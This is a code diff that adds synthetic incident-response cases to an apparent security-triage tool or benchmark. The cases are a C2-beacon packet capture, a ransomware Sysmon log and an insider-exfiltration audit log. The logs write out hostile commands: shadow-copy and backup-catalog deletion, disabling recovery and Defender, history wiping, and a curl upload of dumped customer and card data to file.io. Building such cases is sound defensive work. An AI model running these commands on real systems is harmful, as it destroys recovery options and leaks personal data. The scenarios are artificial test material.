@@ -199,6 +199,121 @@ exfil-gateway.com: registered 2026-05-12 via Namecheap, NS records on cloudflare
 No business reason for this host to query exfil-gateway.com
 `;
 
+// ---------- Higher-risk scenarios ----------
+
+// A real classic-pcap capture (big-endian, link type Ethernet) built offline
+// and embedded as base64, exactly like a captured artifact. It contains a DNS
+// A-record lookup for sync.fastcdn-telemetry.live followed by eight TCP/443
+// beacons from 10.0.9.30 to the public C2 45.61.138.92 at a fixed 30s cadence
+// over four minutes. Decodes via analyze_pcap to a single fat conversation, two
+// destination endpoints, one DNS query, and one public-IP / one domain IOC.
+const c2BeaconPcapBase64 =
+  "obLD1AACAAQAAAAAAAAAAAAA//8AAAABag0HkAAAAAAAAABXAAAAVwJCCgAAAQJCCgAJHggARQAASQABQABAEQAACgAJHgoAADXDUAA1ADUAABI0AQAAAQAAAAAAAARzeW5jEWZhc3RjZG4tdGVsZW1ldHJ5BGxpdmUAAAEAAWoNB64AAAAAAAAAOgAAADoCQgoAAAECQgoACR4IAEUAACwAAUAAQAYAAAoACR4tPYpcxzgBuwAAEAAAACAAUBggAAAAAADerb7vag0HzAAAAAAAAAA6AAAAOgJCCgAAAQJCCgAJHggARQAALAABQABABgAACgAJHi09ilzHOAG7AAAQAAAAIABQGCAAAAAAAN6tvu9qDQfqAAAAAAAAADoAAAA6AkIKAAABAkIKAAkeCABFAAAsAAFAAEAGAAAKAAkeLT2KXMc4AbsAABAAAAAgAFAYIAAAAAAA3q2+72oNCAgAAAAAAAAAOgAAADoCQgoAAAECQgoACR4IAEUAACwAAUAAQAYAAAoACR4tPYpcxzgBuwAAEAAAACAAUBggAAAAAADerb7vag0IJgAAAAAAAAA6AAAAOgJCCgAAAQJCCgAJHggARQAALAABQABABgAACgAJHi09ilzHOAG7AAAQAAAAIABQGCAAAAAAAN6tvu9qDQhEAAAAAAAAADoAAAA6AkIKAAABAkIKAAkeCABFAAAsAAFAAEAGAAAKAAkeLT2KXMc4AbsAABAAAAAgAFAYIAAAAAAA3q2+72oNCGIAAAAAAAAAOgAAADoCQgoAAAECQgoACR4IAEUAACwAAUAAQAYAAAoACR4tPYpcxzgBuwAAEAAAACAAUBggAAAAAADerb7vag0IgAAAAAAAAAA6AAAAOgJCCgAAAQJCCgAJHggARQAALAABQABABgAACgAJHi09ilzHOAG7AAAQAAAAIABQGCAAAAAAAN6tvu8=";
+
+const c2BeaconContext = `Capture host: 10.0.9.30 — WIN-ENG-14 (engineering workstation, CORP\\amalik)
+Capture window: 2026-05-20T01:00Z onward (15-min span pulled by NDR sensor)
+EDR: CrowdStrike Falcon — sensor reporting, no detection fired
+Network policy: workstations may reach the internet via proxy 10.0.0.8 ONLY
+Observed: direct outbound TCP/443 to 45.61.138.92, bypassing the proxy
+sync.fastcdn-telemetry.live: registered 2026-05-18, 2 days before capture
+Note: the beacon interval looks machine-regular, not human browsing.
+`;
+
+const ransomwareInProgressLog = `2026-05-21T02:47:11Z FS-CORP-01 Sysmon EventID=1 (Process create)
+Image: C:\\ProgramData\\svchost-update\\runner.exe
+CommandLine: runner.exe -nolog -enc -targets \\\\FS-CORP-01\\dept_shares
+User: CORP\\svc-backup
+ParentImage: C:\\Windows\\System32\\services.exe
+Hashes: SHA256=9F2C7A4E1B0D6C8855AE13FF20C9B7E4D1A6F309C2B884771E5DA0C3F6B9A1B7
+Signed: false
+
+2026-05-21T02:47:12Z FS-CORP-01 Sysmon EventID=1 (Process create)
+CommandLine: vssadmin.exe delete shadows /all /quiet
+ParentImage: C:\\ProgramData\\svchost-update\\runner.exe
+
+2026-05-21T02:47:12Z FS-CORP-01 Sysmon EventID=1 (Process create)
+CommandLine: wmic.exe shadowcopy delete
+ParentImage: C:\\ProgramData\\svchost-update\\runner.exe
+
+2026-05-21T02:47:13Z FS-CORP-01 Sysmon EventID=1 (Process create)
+CommandLine: bcdedit.exe /set {default} recoveryenabled No
+ParentImage: C:\\ProgramData\\svchost-update\\runner.exe
+
+2026-05-21T02:47:13Z FS-CORP-01 Sysmon EventID=1 (Process create)
+CommandLine: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+ParentImage: C:\\ProgramData\\svchost-update\\runner.exe
+
+2026-05-21T02:47:14Z FS-CORP-01 Sysmon EventID=1 (Process create)
+CommandLine: wbadmin.exe delete catalog -quiet
+ParentImage: C:\\ProgramData\\svchost-update\\runner.exe
+
+2026-05-21T02:47:15Z FS-CORP-01 Sysmon EventID=1 (Process create)
+CommandLine: net.exe stop "Veeam Backup Service" /y
+ParentImage: C:\\ProgramData\\svchost-update\\runner.exe
+
+2026-05-21T02:47:16Z FS-CORP-01 Sysmon EventID=1 (Process create)
+CommandLine: taskkill.exe /F /IM MsMpEng.exe
+ParentImage: C:\\ProgramData\\svchost-update\\runner.exe
+
+2026-05-21T02:47:21Z FS-CORP-01 Sysmon EventID=11 (File create)
+TargetFilename: D:\\dept_shares\\Finance\\FY26_budget.xlsx.lockbit5
+2026-05-21T02:47:21Z FS-CORP-01 Sysmon EventID=11 (File create)
+TargetFilename: D:\\dept_shares\\Finance\\RESTORE-FILES.txt
+2026-05-21T02:47:22Z FS-CORP-01 Sysmon EventID=11 (File create)
+TargetFilename: D:\\dept_shares\\HR\\offer_letters.pdf.lockbit5
+... 41,209 further .lockbit5 file-create events across D:\\dept_shares in 6 min ...
+
+2026-05-21T02:48:30Z FS-CORP-01 Sysmon EventID=3 (Network connect)
+Image: C:\\ProgramData\\svchost-update\\runner.exe
+DestinationIp: 10.0.4.62
+DestinationPort: 445
+DestinationHostname: FS-CORP-02
+
+2026-05-21T02:48:31Z FS-CORP-02 Security EventID=7045 (Service install)
+ServiceName: PSEXESVC
+ImagePath: C:\\Windows\\PSEXESVC.exe
+AccountName: CORP\\svc-backup
+`;
+
+const ransomwareInProgressContext = `Asset: FS-CORP-01 (10.0.4.61) — primary departmental file server
+Shares: D:\\dept_shares — ~2.1 TB, Finance / HR / Legal / Engineering
+Account abused: svc-backup (domain service account, local admin on all file servers)
+  - Password last set: 2024-11-02 (never rotated); used by legacy backup jobs
+Backups: Veeam to on-prem repo (NOT immutable); last successful job 2026-05-20T23:00Z
+  - Offsite/immutable copy: project was scoped but never funded
+EDR: CrowdStrike on workstations; file servers were exempted "for performance"
+Blast radius unknown: svc-backup is local admin on FS-CORP-02..05 as well
+Containment will take production file shares offline for the whole company.
+`;
+
+const insiderExfilLog = `# auditd + pgaudit + shell history — bastion DB host db-bastion-01 (10.0.6.12)
+2026-05-22T23:41:07Z auditd USER_LOGIN acct=rkapoor addr=10.0.6.200 terminal=ssh res=success
+2026-05-22T23:41:55Z bash[rkapoor]: export HISTFILE=/dev/null
+2026-05-22T23:42:10Z bash[rkapoor]: psql -h prod-db-01 -U rkapoor -d customers -c "\\copy (select * from customers) to '/tmp/.c/cust.csv' csv header"
+2026-05-22T23:43:02Z pgaudit prod-db-01 SESSION rkapoor READ customers.customers rows=2841992
+2026-05-22T23:44:18Z bash[rkapoor]: pg_dump -h prod-db-01 -U rkapoor -t payments -t cards customers -Fc -f /tmp/.c/pay.dump
+2026-05-22T23:46:51Z pgaudit prod-db-01 SESSION rkapoor READ customers.cards rows=981233
+2026-05-22T23:48:30Z bash[rkapoor]: tar czf /tmp/.c/export.tgz /tmp/.c/cust.csv /tmp/.c/pay.dump
+2026-05-22T23:49:10Z auditd SYSCALL mount dev=sdb1 fstype=vfat -> /media/rkapoor/USB64 (label KINGSTON)
+2026-05-22T23:49:44Z bash[rkapoor]: cp /tmp/.c/export.tgz /media/rkapoor/USB64/
+2026-05-22T23:51:02Z bash[rkapoor]: curl -sf -T /tmp/.c/export.tgz https://file.io/ -o /tmp/.c/up.json
+2026-05-22T23:51:39Z bash[rkapoor]: shred -u /tmp/.c/cust.csv /tmp/.c/pay.dump /tmp/.c/export.tgz
+2026-05-22T23:51:55Z bash[rkapoor]: history -c
+2026-05-22T23:52:03Z auditd USER_LOGOUT acct=rkapoor addr=10.0.6.200 terminal=ssh
+`;
+
+const insiderExfilContext = `Subject: rkapoor (R. Kapoor) — Senior Database Administrator, Data Platform
+Access: standby read on prod-db-01; full DBA on the staging estate
+HR flag: submitted resignation 2026-05-19; last day 2026-06-02; declared next
+  employer is a direct competitor (per exit interview notes)
+Data touched: customers.customers (PII), customers.payments + customers.cards
+  (PCI scope — cardholder data, encrypted at rest but readable via the app role)
+Policy: bulk export of PCI tables requires a ticket + second approver; none filed
+DLP: endpoint DLP not installed on bastion hosts; USB mass-storage not blocked
+Off-hours: all activity 23:41–23:52 local, outside the subject's normal pattern
+This is a personnel-sensitive matter — conclusions must be strictly evidence-based.
+`;
+
 export const SAMPLE_CASES: SampleCase[] = [
   {
     id: "ssh-bruteforce-breakthrough",
@@ -251,6 +366,47 @@ export const SAMPLE_CASES: SampleCase[] = [
         contentEncoding: "base64",
       },
       { kind: "text", filename: "triage_note.md", content: ransomwareTriageNote },
+    ],
+  },
+  {
+    id: "c2-beacon-pcap",
+    shortLabel: "C2 Beacon (pcap)",
+    title: "Periodic C2 beaconing in a packet capture from WIN-ENG-14",
+    scenario: "Command & control",
+    description:
+      "An NDR sensor pulled a packet capture from engineering workstation WIN-ENG-14 (10.0.9.30). It shows a DNS lookup for a 2-day-old domain followed by repeated TCP/443 connections to a public IP at a fixed 30-second cadence — direct egress that bypasses the mandatory proxy, with no EDR detection. Parse the capture, confirm whether this is automated C2 beaconing, extract the destination indicators, and recommend containment.",
+    artifacts: [
+      {
+        kind: "network_capture",
+        filename: "win-eng-14.pcap",
+        content: c2BeaconPcapBase64,
+        contentEncoding: "base64",
+      },
+      { kind: "text", filename: "capture_context.md", content: c2BeaconContext },
+    ],
+  },
+  {
+    id: "ransomware-in-progress",
+    shortLabel: "Ransomware In Progress",
+    title: "Active ransomware deployment on file server FS-CORP-01",
+    scenario: "Ransomware",
+    description:
+      "An unsigned binary running as the svc-backup service account on the primary departmental file server deleted volume shadow copies, disabled boot recovery, purged the backup catalog, stopped Veeam, killed Defender, and began mass-encrypting D:\\dept_shares (40k+ .lockbit5 files) before pivoting to FS-CORP-02 over SMB with PsExec. Reconstruct the kill chain, scope the blast radius, and recommend immediate containment knowing it will take company-wide file shares offline.",
+    artifacts: [
+      { kind: "log_file", filename: "fs-corp-01_sysmon.log", content: ransomwareInProgressLog },
+      { kind: "text", filename: "asset_context.md", content: ransomwareInProgressContext },
+    ],
+  },
+  {
+    id: "insider-data-theft",
+    shortLabel: "Insider Data Theft",
+    title: "Departing DBA bulk-exfiltrating PII/PCI from db-bastion-01",
+    scenario: "Insider threat",
+    description:
+      "A senior DBA who resigned to join a competitor logged into the DB bastion at 23:41, disabled shell history, dumped 2.8M customer records and ~980k cardholder rows from production, copied the archive to a USB stick and uploaded it to file.io, then shredded the staging files and cleared history — all off-hours with no change ticket or second approver. Establish what was taken, how it left, and recommend response while keeping every conclusion strictly evidence-based.",
+    artifacts: [
+      { kind: "log_file", filename: "db-bastion-01_audit.log", content: insiderExfilLog },
+      { kind: "text", filename: "personnel_context.md", content: insiderExfilContext },
     ],
   },
 ];
